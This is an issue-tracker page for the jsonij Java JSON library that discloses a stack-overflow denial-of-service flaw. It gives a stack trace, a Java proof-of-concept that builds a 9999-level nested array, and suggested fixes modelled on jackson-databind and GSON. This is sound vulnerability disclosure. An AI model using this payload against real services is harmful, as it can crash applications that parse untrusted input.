=== Content from bitbucket.org_be61b885_20250115_084947.html ===


1. [![John Marsden Avatar](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/f0a23e72c4cd/img/default_workspace_avatar/workspace_code.svg)

   John Marsden](/jmarsden/)
2. [Untitled project](/jmarsden/workspace/projects/PROJ)
3. [jsonij](/jmarsden/jsonij)
4. [Issues](/jmarsden/jsonij/issues?status=new&status=open)

# Stack overflow error caused by jsonij parsing of untrusted JSON String

Issue #7

[open](/jmarsden/jsonij/issues?status=open)

![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/f0a23e72c4cd/img/default_avatar/user_blue.svg)

郭逸帆
created an issue
2023-05-25

# Stack overflow error caused by jsonij parsing of untrusted JSON String

## Description

Using jsonij to parse untrusted JSON String may be vulnerable to denial of service (DOS) attacks. If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.

## Error Log

```
Exception in thread "main" java.lang.StackOverflowError
    at jsonij.ArrayImp.internalType(ArrayImp.java:53)
    at jsonij.Value.<init>(Value.java:54)
    at jsonij.ArrayImp.<init>(ArrayImp.java:44)
    at jsonij.JSON$Array.<init>(JSON.java:326)
    at jsonij.parser.JSONParser.parseArray(JSONParser.java:271)
    at jsonij.parser.JSONParser.parseValue(JSONParser.java:180)
    at jsonij.parser.JSONParser.parseArray(JSONParser.java:275)
    at jsonij.parser.JSONParser.parseValue(JSONParser.java:180)
    at jsonij.parser.JSONParser.parseArray(JSONParser.java:275)
    at jsonij.parser.JSONParser.parseValue(JSONParser.java:180)
    at jsonij.parser.JSONParser.parseArray(JSONParser.java:275)

```
## PoC

```
        <dependency>
            <groupId>cc.plural</groupId>
            <artifactId>jsonij</artifactId>
            <version>0.5.2</version>
        </dependency>

```

```
import jsonij.Value;
import jsonij.parser.JSONParser;
import jsonij.parser.ParserException;

public class PoC {

    public final static int TOO_DEEP_NESTING = 9999;
    public final static String TOO_DEEP_DOC = _nestedDoc(TOO_DEEP_NESTING, "[ ", "] ", "0");

    public static String _nestedDoc(int nesting, String open, String close, String content) {
        StringBuilder sb = new StringBuilder(nesting * (open.length() + close.length()));
        for (int i = 0; i < nesting; ++i) {
            sb.append(open);
            if ((i & 31) == 0) {
                sb.append("\n");
            }
        }
        sb.append("\n").append(content).append("\n");
        for (int i = 0; i < nesting; ++i) {
            sb.append(close);
            if ((i & 31) == 0) {
                sb.append("\n");
            }
        }
        return sb.toString();
    }

    public static void main(String[] args) throws ParserException {
        String jsonString = TOO_DEEP_DOC;
        JSONParser jsonParser = new JSONParser();
        Value parse = jsonParser.parse(jsonString);
    }
}

```
## Rectification Solution

1. Refer to the solution of jackson-databind: Add the depth variable to record the current parsing depth. If the parsing depth exceeds a certain threshold, an exception is thrown. ([https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b)](https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b))
2. Refer to the GSON solution: Change the recursive processing on deeply nested arrays or JSON objects to stack+iteration processing.(（[https://github.com/google/gson/commit/2d01d6a20f39881c692977564c1ea591d9f39027）)](https://github.com/google/gson/commit/2d01d6a20f39881c692977564c1ea591d9f39027%EF%BC%89))

‌

## Comments (3)

1. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/f0a23e72c4cd/img/default_avatar/user_blue.svg)

   John Marsden
   repo owner
   * changed status to
     [open](/jmarsden/jsonij/issues?status=open)
   * [2023-05-25T07:13:51+00:00](#comment-65505805 "Link directly to this comment")
2. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/f0a23e72c4cd/img/default_avatar/user_blue.svg)

   John Marsden
   repo owner

   Thank you, straight forward enough to fix.

   * [2023-05-25T07:14:19+00:00](#comment-65505809 "Link directly to this comment")
3. ![](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/f0a23e72c4cd/img/default_avatar/user_blue.svg)

   John Marsden
   repo owner

   Issue [~~#8~~](https://bitbucket.org/jmarsden/jsonij/issues/8/stack-overflow-error-caused-by-jsonij "Stack overflow error caused by jsonij parsing of untrusted JSON String (2)") was marked as a duplicate of this issue.

   * [2023-05-29T03:59:33+00:00](#comment-65521569 "Link directly to this comment")
4. [Log in to comment](/account/signin/?next=/jmarsden/jsonij/issues/7/stack-overflow-error-caused-by-jsonij)

Assignee
–

Type
[bug](/jmarsden/jsonij/issues?kind=bug)

Priority
[major](/jmarsden/jsonij/issues?priority=major)

Status
[open](/jmarsden/jsonij/issues?status=open)

Milestone
–

Votes
0

Watchers
1

[![Jira: the preferred issue tracker for Bitbucket. Join the team!](https://bbc-object-storage--frontbucket.us-east-1.prod.public.atl-paas.net/f0a23e72c4cd/img/promos/jira-promo-issue.png)](https://www.atlassian.com/software/jira/bitbucket-integration?utm_source=bitbucket&utm_medium=in_product_ad&utm_campaign=bitbucket_issues&utm_content=issues_view)


